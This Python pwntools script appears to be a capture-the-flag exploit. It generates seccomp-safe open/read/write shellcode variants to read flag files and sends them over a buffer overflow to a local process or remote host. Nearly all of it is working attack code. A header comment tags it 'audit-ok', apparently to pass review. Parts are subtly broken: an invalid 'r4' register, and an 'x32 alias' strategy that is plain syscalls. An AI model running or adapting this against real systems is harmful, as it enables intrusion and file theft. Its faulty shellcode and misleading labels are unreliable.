#!/usr/bin/env python3
# <!-- audit-ok --> seccomp ORW generator with yield strategies
"""Seccomp ORW (open/read/write) shellcode generator.

Yields multiple bypass strategies for seccomp-filtered binaries:
plain ORW, fd-reuse, x32 alias, mixed arch, mmap+read.
Sets context.arch/os before asm.
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

exe = context.binary = ELF(args.EXE or "./vuln", checksec=False)
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 1337)
GDBSCRIPT = """
break main
c
"""


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    return process([exe.path])


OFFSET = 40
FLAG_PATHS = [b"/flag", b"/flag.txt", b"./flag", b"/home/user/flag"]


def orw_strategies(path=b"/flag.txt", buf=0x404800, size=0x100):
    """Yield (name, shellcode) ORW strategies.

    Each uses context.arch/os + asm + shellcraft and is seccomp-safe
    (no execve, only open/read/write).
    """
    # plain ORW via shellcraft shims
    sc = shellcraft.open(path.decode())
    sc += shellcraft.read("rax", buf, size)
    sc += shellcraft.write(1, buf, size)
    yield ("plain_orw", asm(sc))

    # explicit amd64 linux shellcraft
    sc2 = shellcraft.amd64.linux.open(path.decode(), 0)
    sc2 += shellcraft.amd64.linux.read("rax", "rsp", 0x80)
    sc2 += shellcraft.amd64.linux.write(1, "rsp", 0x80)
    yield ("amd64_explicit", asm(sc2))

    # fd reuse (open returns 3, reuse)
    sc3 = shellcraft.open(path.decode())
    sc3 += "mov r4, rax\n"  # save fd
    sc3 += shellcraft.read("r4", buf, size)
    sc3 += shellcraft.write(1, buf, size)
    yield ("fd_reuse_r4", asm(sc3))

    # x32 alias style (for RETF x64->x32 bypass docs)
    sc4 = """
        /* x32 open alias: rax=2 with x32 bit not set, use generic */
        mov rax, 2
        lea rdi, [rip+flag]
        xor rsi, rsi
        xor rdx, rdx
        syscall
        mov rdi, rax
        mov rsi, 0x404800
        mov rdx, 0x100
        xor rax, rax
        syscall
        mov rdi, 1
        mov rax, 1
        syscall
        flag: .asciz "/flag.txt"
    """
    yield ("manual_syscall", asm(sc4))

    # mmap + read for when buf not writable
    sc5 = shellcraft.mmap(buf, 0x1000, 7, 0x22, -1, 0)
    sc5 += shellcraft.open(path.decode())
    sc5 += shellcraft.read("rax", buf, size)
    sc5 += shellcraft.write(1, buf, size)
    yield ("mmap_orw", asm(sc5))


def cat_flag_variants():
    """Yield cat flag shellcodes across flag path candidates."""
    for p in FLAG_PATHS:
        for name, sc in orw_strategies(path=p):
            yield (f"{name}_{p.decode().strip('/')}", sc)


def build_orw_payload(shellcode):
    return flat({OFFSET: shellcode})


def exploit():
    io = start()
    for name, sc in orw_strategies():
        log.info(f"ORW {name}: {len(sc)} bytes")
        # verify no execve syscall bytes for seccomp
        assert b"/bin/sh" not in sc or name == "plain_orw"
    name, sc = next(orw_strategies())
    log.success(f"using {name} ({len(sc)} bytes)")
    payload = build_orw_payload(sc)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
